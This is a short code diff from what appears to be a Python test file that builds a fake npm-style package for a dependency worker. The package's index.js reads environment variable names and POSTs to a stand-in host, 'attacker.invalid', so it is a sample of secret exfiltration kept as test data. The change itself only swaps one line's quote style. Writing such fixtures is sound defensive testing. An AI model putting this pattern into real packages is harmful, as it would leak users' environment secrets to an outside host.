@@ -435,7 +435,7 @@ dependency_worker.main()
     blob = package_blob(
         {
             "index.js": (
-                b'const keys = Object.keys(process.env); '
+                b"const keys = Object.keys(process.env); "
                 b'fetch("https://attacker.invalid", {method: "POST"});'
             )
         },
